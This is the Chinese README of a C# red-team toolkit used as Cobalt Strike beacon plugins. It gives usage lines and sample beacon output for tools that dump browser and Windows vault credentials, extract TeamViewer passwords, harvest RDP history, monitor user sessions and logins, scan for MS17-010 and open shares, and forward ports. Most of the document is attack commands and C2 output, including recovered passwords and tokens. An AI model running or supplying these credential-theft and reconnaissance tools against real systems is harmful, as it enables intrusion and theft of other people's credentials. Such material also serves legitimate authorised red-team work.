


## 功能说明
做红队时期自己coding的轮子,积累一些实用小功能,整个项目基于C#可自行定制cobaltstrike插件
### SharkBrower
* 当前用户只能获取当前用户浏览器密码
* 管理员权限能获取所有用户浏览器密码
* 普通用户可以获取所有浏览器历史
#### 参数
```
C:\SharkProExec\SharkBrowser\bin\Debug>SharkBrowser.exe

    Usage:
        .\SharkBrowser.exe -p all

    Arguments:
        -p        - all,Chrome,FireFox (<=57),
        -h        - all,chrome,firefox,360es,360chrome,IE num
        -f        - 360chrome
    eg: SharkBrowser.exe -p all
        SharkBrowser.exe -h all 100
```
```
beacon> shark browser credent all
[*] Tasked beacon to run .NET program: SharkBrowser.exe -p all
[+] host called home, sent: 698423 bytes
[+] received output:
[*]: Try to get  Chrome  Credential
[*]: Try to get Fucku Chrome Credential
[+] received output:
[+]: URL:https://cmd5.com/login.aspx Username:aaa@qq.com Password:qweqwe
[*]: Get Fucku Chrome Credential End
[*]: Try to get  FireFox  Credential
[*]: Try to get Fucku FireFox  Credential
[+]: found url:https://qianxin.webex.com.cn, Failed! to decrypt password
[+]: found url:https://cmd5.com, Failed! to decrypt password
[*]: Get Fucku FireFox  Credential end
```

```
beacon> shark browser history ie 4
[*] Tasked beacon to run .NET program: SharkBrowser.exe -h ie 4
[+] host called home, sent: 698425 bytes
[+] received output:
[*]: Try to get DESKTOP-NFGMGRP\Fucku IE Histroy num: 4
[+]: Title: url:http://127.0.0.1:8080/t2/admin 
[+]: Title: url:http://127.0.0.1:8080/t2/login2?password=pass 
[+]: Title: url:http://sdjwxt.syu.edu.cn/jsxsd 
[+]: Title: url:http://cmd5.com/ 
[*]: Try to get DESKTOP-NFGMGRP\Fucku IE Histroy num:4 End

```
```
beacon> shark browser history chrome 5
[*] Tasked beacon to run .NET program: SharkBrowser.exe -h chrome 5
[+] host called home, sent: 698433 bytes
[+] received output:
[*]: Try to get  Chrome  Histroy count:5
[*]: Try to get Fucku Chrome Histroy count:5
[+] received output:
[+]: Title:Aggressor Script Tutorial and Reference url:https://www.cobaltstrike.com/aggressor-script/beacon.html 
[*]: Get Fucku Chrome Histroy End
```
### SharkCredentials
* system权限运行
* win|web 
* x64|x86
*  默认.NET3.5以上版本可以编译，通过外部引用.net3.5 system.core 可以实现在.net2.0环境中编译。
*  通过外部引用system.core.dll  属性嵌入编译
*  相对于mimikatz vault::cred 能抓到更多得密码，
*  经测试发现直接在本地执行mimikatz.exe回显结果比较全
#### 参数
```
C:\SharkProExec\SharkCredentials\bin\Debug>SharkCredentials.exe

    Usage:
        .\SharkCredentials.exe -c all
    Arguments:
         -c        - all,web,windows
    eg: SharkCredentials.exe -c web
        SharkCredentials.exe all

```
```
beacon> shark credent win x64
[*] Tasked beacon to run .NET program: SharkCredentials_x64.exe -c windows
[+] host called home, sent: 862783 bytes
[+] received output:
*: Try to get Windows Credentials
[+] received output:
[+]: OWNER:Fucku TARGET:LegacyGeneric:target=git:https://github.com USERNAME:LegacyGeneric:target=git:https://github.com PASSWORD:Test TIME:Test.
[+]: OWNER:Fucku TARGET:LegacyGeneric:target=TERMSRV/192.168.47.128 USERNAME:LegacyGeneric:target=TERMSRV/192.168.47.128 PASSWORD:DESKTOP-NFGMGRP\administrator TIME:
[+]: OWNER:Fucku TARGET:LegacyGeneric:target=MicrosoftAccount:user=Testgitc@163.com USERNAME:LegacyGeneric:target=MicrosoftAccount:user=Testgitc@163.com PASSWORD:Testgitc@163.com TIME:
[+]: OWNER:Fucku TARGET:WindowsLive:target=virtualapp/didlogical USERNAME:WindowsLive:target=virtualapp/didlogical PASSWORD:02uoxmeoatckoqhf TIME:
[+]: OWNER:Fucku TARGET:LegacyGeneric:target=OneDrive USERNAME:LegacyGeneric:target=OneDrive PASSWORD:154c3c5bcf361ef6 TIME:4d 43 51 4c 7a 6e 54 74 5a 67 43 79 4f 63 79 77 31 35 38 63 52 75 67 38 6c 5a 42 44 69 6c 72 74 6f 57 62 44 32 43 72 68 6f 6b 6c 72 7a 70 6e 57 63 53 31 71 52 74 2a 64 4b 59 33 53 59 32 59 65 75 33 53 49 73 55 35 31 77 4d 52 51 59 45 76 4c 4d 30 39 49 4a 68 4f 2a 77 41 78 6f 4d 31 65 32 41 44 46 4e 31 42 4a 30 68 46 78 79 4c 36 4f 33 38 7a 58 6f 47 65 65 38 78 70 75 51 45 37 62 64 51 57 42 69 73 63 64 75 47 62 50 77 61 43 46 4a 43 77 50 46 33 32 71 54 4c 38 55 53 66 41 78 6d 45 39 76 47 4a 34 78 61 48 65 5a 62 4d 49 6e 57 4d 4a 38 6c 54 72 55 66 64 65 50 5a 59 4c 56 77 54 57 7a 4a 41 6c 78 46 2a 70 52 62 49 43 6f 7a 45 4a 32 57 37 74 58 53 44 63 65 4e 47 4b 39 77 6f 2a 34 73 57 46 55 43 74 45 4b 7a 6a 54 62 34 75 53 38 67 76 6a 55 42 54 48 59 66 75 5a 48 2a 2a 4b 4a 55 75 71 49 34 44 73 6d 38 6c 6e 6b 4e 21 44 34 69 31 77 77 6f 77 4c 67 5a 62 79 6c 58 6a 63 74 2a 2a 6f 78 66 6c 55 6b 34 48 54 39 2a 79 64 53 4f 64 56 37 64 30 77 4c 73 6f 4e 38 50 55 30 4f 36 56 38 48 4a 52 74 55 51 69 21 71 6a 46 38 45 78 67 30 74 7a 6b 6a 70 7a 31 6f 44 6f 4b 6b 49 39 33 56 70 61 58 39 21 4e 6e 
[+]: OWNER:Fucku TARGET:LegacyGeneric:target=ｑｑｑ USERNAME:LegacyGeneric:target=ｑｑｑ PASSWORD:ｑｑｑ TIME:wqqq
[+]: OWNER:Fucku TARGET:Domain:target=１１ USERNAME:Domain:target=１１ PASSWORD:１１ TIME:11
*: Try to get Windows Credentials end
```

### SharkDump
通过teamview 窗口获取访问密码
#### 参数
```
C:\SharkProExec\SharkDump\bin\Debug>SharkDump.exe

    Usage:
        .\SharkDump.exe -p tv
    Arguments:
        -p        tv

    eg: SharkDump.exe -p tv

```

###  SharkInfo
收集本机关联IP
* MstscIp
* EventIp
* Connection Ip
* IE 
#### 参数
```
C:\SharkProExec\SharkInfo\bin\Debug>SharkInfo.exe

    Usage:
        .\SharkInfo.exe -a
    Arguments:
         -a         ip
    eg: SharkInfo.exe -a ip
```
### SharkMonitor
通过API获取用户登录,`net use`进行挂盘监听
#### 参数
```
C:\SharkProExec\SharkMonitor\bin\Debug>SharkMonitor.exe


    Arguments:

        -t   Time interval per scan( default:3000)

    eg: SharkMonitor.exe -t 50000

``` 
### SharkRdp
获取rdp相关记录
* mstsc
* log 
#### 参数
```
C:\SharkProExec\SharkRdp\SharkRdp\bin\Debug>SharkRdp.exe

    Usage:
        .\SharkRdp.exe -r all 10
    Arguments:
         -r        - all,log,mstsc default num :10
    eg: SharkRdp.exe -r all
        SharkRdp.exe -r mstsc 10
```
```
beacon> shark rdp all
[*] Tasked beacon to run .NET program: SharkRdp.exe -r all 
[+] host called home, sent: 114233 bytes
[+] received output:
[*]: Try to get rdp log  num: 10
[+]: USERNAME: DESKTOP-NFGMGRP$ DOAMIN:WORKGROUP  IP:- 
[+]: USERNAME: DESKTOP-NFGMGRP$ DOAMIN:WORKGROUP  IP:- 
[+] received output:
[+]: USERNAME: - DOAMIN:-  IP:- 
[+]: USERNAME: DESKTOP-NFGMGRP$ DOAMIN:WORKGROUP  IP:- 
[+]: USERNAME: DESKTOP-NFGMGRP$ DOAMIN:WORKGROUP  IP:- 
[+]: USERNAME: DESKTOP-NFGMGRP$ DOAMIN:WORKGROUP  IP:- 
[+]: USERNAME: DESKTOP-NFGMGRP$ DOAMIN:WORKGROUP  IP:- 
[+]: USERNAME: DESKTOP-NFGMGRP$ DOAMIN:WORKGROUP  IP:- 
[+]: USERNAME: DESKTOP-NFGMGRP$ DOAMIN:WORKGROUP  IP:- 
[+]: USERNAME: DESKTOP-NFGMGRP$ DOAMIN:WORKGROUP  IP:- 
[*]: Try to get DESKTOP-NFGMGRP\Fucku MSTSC Histroy num: 10
[+]: 192.168.47.100
[+]: 192.168.47.128
[+]: 192.168.47.8
[*]: Try to get DESKTOP-NFGMGRP\Fucku MSTSC Histroy num: 10 End

```
### SharkScan
* port
* alive
* netshare
* ms17010
* NBNS/多网卡
#### 参数
```
C:\SharkProExec\SharkScan\bin\Debug>SharkScan.exe

    Usage:
        .\SharkScan.exe action [-ips|-ipf] -p -tp -A -ping
    Arguments:
        action     port | alive | netshare| ms17010
        -ips:      127.0.0.1-127.0.0.24 | 127.0.0.1/24 | 127.0.0.1,127.0.0.2
        -ipf       c:\host.txt
        -p         80,8080|80-88
        -tp        default 0
        -A         get server name
        -ping      ping

    eg: SharkScan.exe  port -ips 192.168.220.1/24 -p 30,31 -tp 10 -out D:\12.txt
        SharkScan.exe  ms17010 -ipf c:\1.txt -out D:\12.txt
        SharkScan.exe  alive -ips 192.168.47.99-192.168.47.200 -out D:\12.txt
        SharkScan.exe  netshare -ips 192.168.47.99-192.168.47.200 -out D:\12.txt

```
```
C:\Debug>SharkScan.exe  port -ips 10.10.172.226/24  -p 445  -A
[*] : Remove duplicate ip count: 253
[*] : Ip Count:253 Port Count:1
[*] : Start Scanning Port
[+] : 10.10.172.18 445 hostname ad.cn Windows  10 Enterprise 6.3 10.10.172.18, 192.168.137.1
```
```
C:\Debug>SharkScan.exe  netshare -ips 10.10.172.226/24 

[*] : Start Scanning NetShare
[+] : \\10.10.172.183\F$ requirePassword
[+] : \\10.10.172.181\share Available
[+] : \\10.10.172.183\IPC$ UnAvailable
[+] : \\10.10.172.138\print$ Available
```
```
C:\Debug>SharkScan.exe  ms17010 -ips 10.10.172.226
[*] : Remove duplicate ip count: 1
[*] : Start Scanning Port
[+] : 10.10.172.226 445
[*] : Scan Port End
[*] : Start Scanning MS17010
[-] : 10.10.172.226 ms17010 Is  Vulnerable
[*] : Scan MS17010 End
```

### SharkSession
* ips 192.168.1.1,192.168.1.2 目标ip，可以是多个
* -u user1,user2 监听空户名，可以是多个，当索引到用户session时会打印数据
* -r 每间隔多少秒获取一次
* -out 保存的路径
#### 参数
```
C:\SharkProExec\SharkSession\bin\Debug>SharkSession.exe

    Usage:
        .\SharkSession.exe ip user -r time -out logfile

:       ip      192.168.1.111
        -u     user1,user2
        -l      show all
        -r       6
        -out    c;\1.log
    eg: SharkSession.exe 192.168.1.111
        SharkSession.exe 192.168.1.111  -u user1,user2  -l  -r  6  -out C:\1.txt

```
```
beacon> shark session 192.168.47.111
[*] Tasked beacon to run .NET program: SharkSession.exe 192.168.47.111      
[+] host called home, sent: 119379 bytes
[+] received output:
[*] : Start Dump Session
[+] received output:
[*] : 2020/2/25 22:55:20 192.168.47.111 > cname \\192.168.47.128 clinet liming
[*] : Dump Session End
```


```
beacon> shark session 192.168.47.111 -u liming -r 5 -out c:\users\liming\session2.txt
[*] Tasked beacon to run .NET program: SharkSession.exe 192.168.47.111 -u liming -r 5 -out c:\users\liming\session2.txt
[+] host called home, sent: 119465 bytes
[+] received output:
[*] : Start Dump Session
[+] received output:
[+] : 2020/2/25 23:04:28 192.168.47.111 > cname \\192.168.47.128 clinet liming
```
### SharkTools
* 转发端口
* bypass
#### 参数
```
C:\SharkProExec\SharkTools\bin\Debug>SharkTools.exe


    Arguments:

        -a        pf
        -lp:      8081
        -rh       123.1.1.1
        -rp        8081

    eg: SharkTools.exe  -a pf -lp 8081 -rh 123.1.1.1 -rp 8081
```
### SharkZip
* zip
* unzip
#### 参数
```
C:\SharkProExec\SharkZip\bin\Debug>SharkZip.exe

    Usage:
        .\SharkZip.exe action type args
    Arguments:
        action     u|z
        type       dir|file

    eg: SharkZip.exe u  d:\\1.zip d:\\file
        SharkZip.exe z dir d:\\files\ d:\\1.zip
        SharkZip.exe z file d:\\1.txt d:\1.zip
```

```

beacon> shark zip z file D:\12.txt D:\12.zip
[*] Tasked beacon to run .NET program: SharkZip.exe z file D:\12.txt D:\12.zip
[+] host called home, sent: 310879 bytes
[+] received output:
[+]: Zip to directory D:\12.zip

beacon> shark zip u D:\12.zip D:\12
[*] Tasked beacon to run .NET program: SharkZip.exe u D:\12.zip D:\12 
[+] host called home, sent: 310863 bytes
[+] received output:
[+]: Unzip to directory D:\12
```

## 更新说明
* 2021.1.18 -- 去除IP重复项
* 2021.1.15 -- 添加netshare扫描
* 2020.5.24 -- 添加toolsi集成了端口转发
* 2020.5.13 -- 添加dump teamviewer 密码
* 2020.5.14 -- 添加360浏览器历史

## 感谢

这个圈子太浮躁，致敬那些安心做技术的hacker
